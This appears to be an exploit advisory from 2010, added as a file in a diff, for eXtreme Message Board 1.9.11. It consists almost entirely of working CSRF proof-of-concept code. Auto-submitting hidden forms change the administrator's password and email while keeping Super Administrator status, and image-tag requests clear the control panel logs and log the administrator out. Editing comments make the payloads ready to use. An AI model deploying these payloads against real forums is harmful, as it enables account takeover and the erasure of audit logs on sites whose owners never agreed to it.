@@ -1,0 +1,62 @@
+<!---
+    Title: eXtreme Message Board 1.9.11 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Thu 15 Jul 2010 12:08:07 PM EEST
+    Vendor: http://www.xmbforum.com/
+    Download: http://www.xmbforum.com/download/XMB-1.9.11.09.zip
+--->
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    -=[ Method 1 - editprofile.php ]=-
+    
+        <html>
+            <head>
+                <title>eXtreme Message Board 1.9.11 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+            </head>
+            <body onload="document.csrf.submit();">
+                <form name="csrf" action="http://[domain]/[path]/editprofile.php?user=admin" method="post">
+                    <!--- Edit these --->
+                    <input type="hidden" name="username" value="admin" />
+                    <input type="hidden" name="newemail" value="root@root.com" />
+                    <input type="hidden" name="newpassword" value="rootroot" />
+                    <!--- Do not edit below --->
+                    <input type="hidden" name="status" value="Super Administrator" />
+                    <input type="hidden" name="editsubmit" value="Edit Profile" />
+                </form>
+            </body>
+        </html>
+        
+    -=[ Method 2 - cp.php ]=-
+    
+        <html>
+            <head>
+                <title>eXtreme Message Board 1.9.11 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+            </head>
+            <body onload="document.csrf.submit();">
+                <form name="csrf" action="http://[domain]/[path]/cp.php?action=members" method="post">
+                    <!--- Edit this --->
+                    <input type="hidden" name="pw1" value="rootroot" />
+                    <!--- Fun --->
+                    <input type="hidden" name="postnum1" value="1337" />
+                    <input type="hidden" name="cusstatus1" value="rooted" />
+                    <!--- Do not edit below --->
+                    <input type="hidden" name="srchmem" value="admin" />
+                    <input type="hidden" name="status1" value="Super Administrator" />
+                    <input type="hidden" name="membersubmit" value="Submit Changes" />
+                </form>
+            </body>
+        </html>
+    
+-=[ CSRF PoC 2 - Clear Control Panel Logs ]=-
+    
+    <img src="http:/[domain]/[path]/tools.php?action=logsdump&yessubmit=Yes" alt="Do you see this?" />    
+
+-=[ CSRF PoC 3 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/[path]/misc.php?action=logout" alt="Do you see this?" />
+
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
